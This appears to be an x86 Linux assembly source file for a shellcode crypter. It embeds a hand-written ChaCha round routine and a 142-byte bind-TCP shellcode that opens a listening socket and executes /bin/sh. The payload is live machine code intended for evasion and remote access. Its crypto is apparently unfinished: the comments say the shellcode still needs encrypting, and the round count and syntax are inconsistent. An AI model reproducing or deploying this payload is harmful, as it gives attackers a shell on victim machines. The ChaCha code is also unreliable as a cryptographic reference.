global _start

section .data
	matrixm: db 0x65, 0x78, 0x70, 0x61, \
		0x6e, 0x64, 0x20, 0x33, \
		0x32, 0x2d, 0x62, 0x79, \
		0x74, 0x65, 0x20, 0x6b, \
		0x4c, 0x4f, 0x4e, 0x47, \
		0x4c, 0x4f, 0x4e, 0x47, \
		0x50, 0x41, 0x53, 0x53, \
		0x57, 0x4f, 0x52, 0x44, \
		0x4c, 0x4f, 0x4e, 0x47, \
		0x4c, 0x4f, 0x4e, 0x47, \
		0x50, 0x41, 0x53, 0x53, \
		0x57, 0x4f, 0x52, 0x44
		dd 4 dup (?)
	
section .bss
	matrixv resd 16		; 512-bits

section .text
_start:
	jmp payload

; the chacha quarter round function
; input: four 32-bit integer a, b, c and d
; output: quarterround(a, b, c, d)
qr:
	push ebp
	mov ebp, esp
				; qr(a,b,c,d) where a, b, c and d (dword)

	add eax, ebx		; a + b
	xor edx, eax		; d xor a
	rol edx, 0x10		; d <<< 16

	add ecx, edx		; c + d
	xor ebx, ecx		; b xor c
	rol ebx, 0xc		; b <<< 12
	
	add eax, ebx		; a + b
	xor edx, eax		; d xor a
	rol edx, 0x8		; d <<< 8

	add ecx, edx		; c + d
	xor ebx, ecx		; b xor c
	rol ebx, 0x7		; b <<< 7
	
	leave			
	ret

round:
	push ebp
	mov ebp, esp
	
	mov ecx, 0x9		; 20 rounds (Nr/2-1)
				; Nr (Rounds number)
round_l:
	push ecx
	; odd number
	; first line
	mov eax, [matrixv]
	mov ebx, [matrixv+16]
	mov ecx, [matrixv+32]
	mov edx, [matrixv+48]
	call qr			; QR(v0,v4,v8,v12)
	
	mov [matrixv], eax
	mov [matrixv+16], ebx
	mov [matrixv+32], ecx
	mov [matrixv+48], edx
	
	; second line
	mov eax, [matrixv+4]
	mov ebx, [matrixv+20]	
	mov ecx, [matrixv+36]
	mov edx, [matrixv+52]
	call qr			; QR(v1,v5,v9,v13)
	
	mov [matrixv+4], eax
	mov [matrixv+20], ebx
	mov [matrixv+36], ecx
	mov [matrixv+52], edx
	
	; third line
	mov eax, [matrixv+8]
	mov ebx, [matrixv+24]	
	mov ecx, [matrixv+40]
	mov edx, [matrixv+56]
	call qr			; QR(v2,v6,v10,v14)
	
	mov [matrixv+8], eax
	mov [matrixv+24], ebx
	mov [matrixv+40], ecx
	mov [matrixv+56], edx
	
	; fourth line
	mov eax, [matrixv+12]
	mov ebx, [matrixv+28]
	mov ecx, [matrixv+44]
	mov edx, [matrixv+60]
	call qr			; QR(v3,v7,v11,v15)
	
	mov [matrixv+12], eax
	mov [matrixv+28], ebx
	mov [matrixv+44], ecx
	mov [matrixv+60], edx
	
	; even number
	; first line
	mov eax, [matrixv]	
	mov ebx, [matrixv+20]
	mov ecx, [matrixv+40]
	mov edx, [matrixv+60]
	call qr			; QR(v0,v5,v10,v15)
	
	mov [matrixv], eax
	mov [matrixv+20], ebx
	mov [matrixv+40], ecx
	mov [matrixv+60], edx
	
	; second line
	mov eax, [matrixv+4]
	mov ebx, [matrixv+24]
	mov ecx, [matrixv+44]
	mov edx, [matrixv+48]
	call qr			; QR(v1,v6,v11,v12)
	
	mov [matrixv+4], eax
	mov [matrixv+24], ebx
	mov [matrixv+44], ecx
	mov [matrixv+48], edx
	
	; third line
	mov eax, [matrixv+8]
	mov ebx, [matrixv+28]
	mov ecx, [matrixv+32]
	mov edx, [matrixv+52]
	call qr			; QR(v2,v7,v8,v13)
	
	mov [matrixv+8], eax
	mov [matrixv+28], ebx
	mov [matrixv+32], ecx
	mov [matrixv+52], edx
	
	; fourth line
	mov eax, [matrixv+12]
	mov ebx, [matrixv+16]
	mov ecx, [matrixv+36]
	mov edx, [matrixv+56]
	call qr			; QR(v3,v4,v9,v14)
	
	mov [matrixv+12], eax
	mov [matrixv+16], ebx
	mov [matrixv+36], ecx
	mov [matrixv+56], edx
	
	pop ecx
	dec ecx
	jnz round_l
	
	leave
	ret

; computation of a 64-byte block of the stream of Chacha
; input: key, nonce, block counter stored in matrix M
; output: a 64-byte block of the stream
block:	
	pop esi
	push esi		; shellcode address
	
	mov ecx, 0x10		; (matrix size) dword
	lea esi, [matrixm]
	lea edi, [matrixv]
	cld			; increment index of ESI|EDI
	rep movsd		
	
	call round
	
	loop block
	
	jmp shellcode
payload:
	call block	
	; bind_tcp (have to XOR)
	; size 0x8e (142)
	shellcode: db 0x31,0xff,0x31,0xd2,0x31,0xdb,0x31,0xc0,0x52,0x6a,0x01,0x6a,0x02,0x89,0xe1,0xb3,0x01,0xb0,0x66,0xcd,0x80,0x31,0xd2,0x52,0x66,0xba,0x05,0x39,0xc1,0xe2,0x10,0xb2,0x02,0x52,0x89,0xe1,0x6a,0x10,0x51,0x50,0x89,0xe1,0xb3,0x02,0xb0,0x66,0xcd,0x80,0x5a,0x57,0x52,0x89,0xe1,0xb3,0x04,0xb0,0x66,0xcd,0x80,0x57,0x57,0x89,0xe1,0x57,0x57,0x52,0x89,0xe1,0xb3,0x05,0xb0,0x66,0xcd,0x80,0x31,0xc9,0xb1,0x02,0x89,0xc3,0x51,0x31,0xc0,0xb0,0x3f,0xcd,0x80,0x59,0x49,0x7d,0xf5,0xeb,0x1c,0x5e,0x31,0xdb,0x8d,0x4e,0x0d,0x89,0x0e,0x89,0x5e,0x04,0x88,0x5e,0x0f,0x8d,0x56,0x04,0x8d,0x0e,0x8d,0x5e,0x08,0x31,0xc0,0xb0,0x0b,0xcd,0x80,0xe8,0xdf,0xff,0xff,0xff,0x5a,0x5a,0x5a,0x5a,0x4e,0x4e,0x4e,0x4e,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x4e
